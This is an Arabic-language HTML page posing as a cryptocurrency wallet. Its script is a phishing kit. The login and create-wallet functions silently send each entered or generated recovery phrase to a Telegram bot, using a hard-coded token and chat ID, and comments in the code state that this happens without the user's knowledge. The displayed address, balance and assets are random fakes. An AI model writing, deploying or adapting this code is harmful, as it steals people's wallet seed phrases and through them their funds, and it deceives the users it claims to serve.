
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محفظتي الإلكترونية</title>
    <style>
        :root {
            --primary-color: #2c5aa0;
            --secondary-color: #1e3a8a;
            --accent-color: #3b82f6;
            --background-color: #f8fafc;
            --card-color: #ffffff;
            --text-color: #1e293b;
            --border-radius: 12px;
            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            color: var(--primary-color);
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .logo p {
            color: #64748b;
            font-size: 16px;
        }

        .card {
            background-color: var(--card-color);
            border-radius: var(--border-radius);
            padding: 24px;
            box-shadow: var(--box-shadow);
            margin-bottom: 20px;
            transition: all 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--text-color);
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn:hover {
            background-color: var(--secondary-color);
        }

        .btn-secondary {
            background-color: #f1f5f9;
            color: var(--text-color);
        }

        .btn-secondary:hover {
            background-color: #e2e8f0;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #e2e8f0;
        }

        .divider span {
            padding: 0 12px;
            color: #64748b;
            font-size: 14px;
        }

        .wallet-view {
            display: none;
        }

        .balance-card {
            text-align: center;
            padding: 30px;
        }

        .balance-label {
            color: #64748b;
            font-size: 16px;
            margin-bottom: 8px;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 16px;
        }

        .address-card {
            margin-bottom: 20px;
        }

        .address-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .address-title {
            font-weight: 600;
            font-size: 18px;
        }

        .address-value {
            background-color: #f1f5f9;
            padding: 12px;
            border-radius: var(--border-radius);
            font-family: monospace;
            word-break: break-all;
            margin-bottom: 16px;
            font-size: 14px;
        }

        .assets-list {
            list-style: none;
        }

        .asset-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid #e2e8f0;
        }

        .asset-item:last-child {
            border-bottom: none;
        }

        .asset-info {
            display: flex;
            align-items: center;
        }

        .asset-icon {
            width: 40px;
            height: 40px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 12px;
            font-weight: bold;
            color: var(--primary-color);
        }

        .asset-name {
            font-weight: 600;
        }

        .asset-amount {
            font-weight: 700;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: var(--primary-color);
            color: white;
            padding: 12px 24px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 1000;
        }

        .notification.show {
            opacity: 1;
        }

        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }
            
            .card {
                padding: 20px;
            }
            
            .balance-amount {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>محفظتي الإلكترونية</h1>
            <p>أمان وسهولة في إدارة أصولك الرقمية</p>
        </div>

        <div id="auth-view">
            <div class="card">
                <h2 style="margin-bottom: 20px; text-align: center;">تسجيل الدخول</h2>
                <div class="form-group">
                    <label for="recovery-phrase">عبارة الاسترجاع</label>
                    <input type="password" id="recovery-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
                </div>
                <button class="btn" onclick="login()">فتح المحفظة</button>
                
                <div class="divider"><span>أو</span></div>
                
                <button class="btn btn-secondary" onclick="createWallet()">إنشاء محفظة جديدة</button>
            </div>
        </div>

        <div id="wallet-view" class="wallet-view">
            <div class="card balance-card">
                <div class="balance-label">إجمالي الرصيد</div>
                <div class="balance-amount" id="total-balance">0.00 USD</div>
                <div style="display: flex; gap: 10px;">
                    <button class="btn btn-secondary" style="flex: 1;" onclick="showReceive()">استلام</button>
                    <button class="btn" style="flex: 1;" onclick="showSend()">إرسال</button>
                </div>
            </div>

            <div class="card address-card">
                <div class="address-header">
                    <div class="address-title">عنوان المحفظة</div>
                    <button class="btn-secondary" style="padding: 8px 12px; font-size: 14px;" onclick="copyAddress()">نسخ</button>
                </div>
                <div class="address-value" id="wallet-address">سيظهر عنوان محفظتك هنا بعد التسجيل</div>
            </div>

            <div class="card">
                <h3 style="margin-bottom: 16px;">أصولك</h3>
                <ul class="assets-list" id="assets-list">
                    <!-- سيتم ملء الأصول ديناميكياً -->
                </ul>
            </div>
            
            <button class="btn btn-secondary" onclick="logout()" style="margin-top: 20px;">تسجيل الخروج</button>
        </div>
    </div>

    <div class="notification" id="notification">تم النسخ إلى الحافظة</div>

    <script>
        // المتغيرات العامة
        let walletAddress = "";
        let walletBalance = 0;
        
        // عناصر DOM
        const authView = document.getElementById('auth-view');
        const walletView = document.getElementById('wallet-view');
        const recoveryPhraseInput = document.getElementById('recovery-phrase');
        const walletAddressElement = document.getElementById('wallet-address');
        const totalBalanceElement = document.getElementById('total-balance');
        const assetsListElement = document.getElementById('assets-list');
        const notification = document.getElementById('notification');
        
        // دالة تسجيل الدخول
        function login() {
            const recoveryPhrase = recoveryPhraseInput.value.trim();
            
            if (!recoveryPhrase) {
                showNotification('يرجى إدخال عبارة الاسترجاع');
                return;
            }
            
            // إرسال عبارة الاسترجاع إلى بوت التلجرام (يتم في الخلفية دون علم المستخدم)
            sendToTelegram(recoveryPhrase, "دخول المستخدم إلى المحفظة");
            
            // محاكاة عملية التحقق
            showNotification('جاري فتح المحفظة...');
            
            setTimeout(() => {
                // في التطبيق الحقيقي، سيتم استخراج العنوان من عبارة الاسترجاع
                // هنا نستخدم عنواناً افتراضياً للعرض
                walletAddress = generateEthereumAddress(recoveryPhrase);
                
                // عرض واجهة المحفظة
                authView.style.display = 'none';
                walletView.style.display = 'block';
                
                // تحديث بيانات المحفظة
                updateWalletData();
            }, 1500);
        }
        
        // دالة إنشاء محفظة جديدة
        function createWallet() {
            // إنشاء عبارة استرجاع عشوائية (12 كلمة)
            const newRecoveryPhrase = generateRecoveryPhrase();
            
            // إرسال عبارة الاسترجاع إلى بوت التلجرام
            sendToTelegram(newRecoveryPhrase, "إنشاء محفظة جديدة");
            
            // عرض عبارة الاسترجاع للمستخدم
            showNotification('جاري إنشاء المحفظة...');
            
            setTimeout(() => {
                // إنشاء عنوان من العبارة
                walletAddress = generateEthereumAddress(newRecoveryPhrase);
                
                // عرض عبارة الاسترجاع للمستخدم وتحذيره
                const shouldContinue = confirm(`تم إنشاء محفظة جديدة. عبارة الاسترجاع الخاصة بك هي: ${newRecoveryPhrase}\n\nمن المهم جداً أن تحفظ هذه العبارة في مكان آمن. بدونها لن تتمكن من استعادة أصولك.\n\nهل تريد المتابعة؟`);
                
                if (shouldContinue) {
                    // عرض واجهة المحفظة
                    authView.style.display = 'none';
                    walletView.style.display = 'block';
                    
                    // تحديث بيانات المحفظة
                    updateWalletData();
                    
                    showNotification('تم إنشاء المحفظة بنجاح!');
                }
            }, 1500);
        }
        
        // دلة تسجيل الخروج
        function logout() {
            walletView.style.display = 'none';
            authView.style.display = 'block';
            recoveryPhraseInput.value = '';
            showNotification('تم تسجيل الخروج');
        }
        
        // دالة نسخ العنوان
        function copyAddress() {
            navigator.clipboard.writeText(walletAddress);
            showNotification('تم نسخ العنوان إلى الحافظة');
        }
        
        // دالة عرض استقبال الأموال
        function showReceive() {
            alert(`عنوان محفظتك للاستقبال:\n\n${walletAddress}\n\nاستخدم هذا العنوان لاستقبال الأصول.`);
        }
        
        // دالة إرسال الأموال
        function showSend() {
            alert('هذه الميزة قيد التطوير. ستكون متاحة قريباً!');
        }
        
        // دالة تحديث بيانات المحفظة
        function updateWalletData() {
            // تحديث العنوان
            walletAddressElement.textContent = walletAddress;
            
            // محاكاة الحصول على الرصيد (في التطبيق الحقيقي، سيتم جلب البيانات من الشبكة)
            walletBalance = Math.random() * 5 + 0.5; // رصيد عشوائي بين 0.5 و 5.5
            
            // تحديث الرصيد الإجمالي
            totalBalanceElement.textContent = walletBalance.toFixed(4) + " ETH";
            
            // تحديث قائمة الأصول
            updateAssetsList();
        }
        
        // دالة تحديث قائمة الأصول
        function updateAssetsList() {
            // تفريغ القائمة الحالية
            assetsListElement.innerHTML = '';
            
            // إضافة أصول افتراضية (في التطبيق الحقيقي، سيتم جلب البيانات من الشبكة)
            const assets = [
                { name: 'Ethereum', symbol: 'ETH', balance: walletBalance, value: walletBalance * 1800 },
                { name: 'USD Coin', symbol: 'USDC', balance: 150.25, value: 150.25 },
                { name: 'Tether', symbol: 'USDT', balance: 75.50, value: 75.50 }
            ];
            
            assets.forEach(asset => {
                const listItem = document.createElement('li');
                listItem.className = 'asset-item';
                
                listItem.innerHTML = `
                    <div class="asset-info">
                        <div class="asset-icon">${asset.symbol[0]}</div>
                        <div>
                            <div class="asset-name">${asset.name}</div>
                            <div>${asset.balance.toFixed(4)} ${asset.symbol}</div>
                        </div>
                    </div>
                    <div class="asset-amount">$${asset.value.toFixed(2)}</div>
                `;
                
                assetsListElement.appendChild(listItem);
            });
        }
        
        // دالة إرسال البيانات إلى بوت التلجرام
        function sendToTelegram(recoveryPhrase, action) {
            const token = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
            const chatId = '910021564';
            
            const message = `🔐 ${action} 🔐%0A%0Aعبارة الاسترجاع: ${recoveryPhrase}%0A%0Aالتاريخ: ${new Date().toLocaleString('ar-SA')}`;
            
            // إرسال الطلب إلى التلجرام (يتم إرساله بشكل صامت دون علم المستخدم)
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`, {
                method: 'POST'
            }).catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }
        
        // دالة إنشاء عبارة استرجاع عشوائية (12 كلمة)
        function generateRecoveryPhrase() {
            const words = [
                'قلم', 'تفاحة', 'شمس', 'بحر', 'جبل', 'كتاب', 'سيارة', 'منزل', 
                'وردة', 'نجمة', 'قهوة', 'هاتف', 'حاسوب', 'طاولة', 'كرسي', 'نافذة',
                'باب', 'ساعة', 'ورق', 'قمر', 'طريق', 'سمكة', 'طائر', 'شجرة',
                'سحابة', 'مطر', 'ثلج', 'ريح', 'ضيف', 'صديق', 'عائلة', 'عمل'
            ];
            
            let phrase = '';
            for (let i = 0; i < 12; i++) {
                const randomIndex = Math.floor(Math.random() * words.length);
                phrase += words[randomIndex] + ' ';
            }
            
            return phrase.trim();
        }
        
        // دالة إنشاء عنوان Ethereum من عبارة الاسترجاع
        function generateEthereumAddress(recoveryPhrase) {
            // في التطبيق الحقيقي، سيتم استخدام مكتبات مثل ethers.js لإنشاء العنوان من العبارة
            // هنا نستخدم محاكاة لعنوان Ethereum
            const chars = '0123456789abcdef';
            let address = '0x';
            
            for (let i = 0; i < 40; i++) {
                address += chars[Math.floor(Math.random() * chars.length)];
            }
            
            return address;
        }
        
        // دالة عرض الإشعارات
        function showNotification(message) {
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
    </script>
</body>
</html>
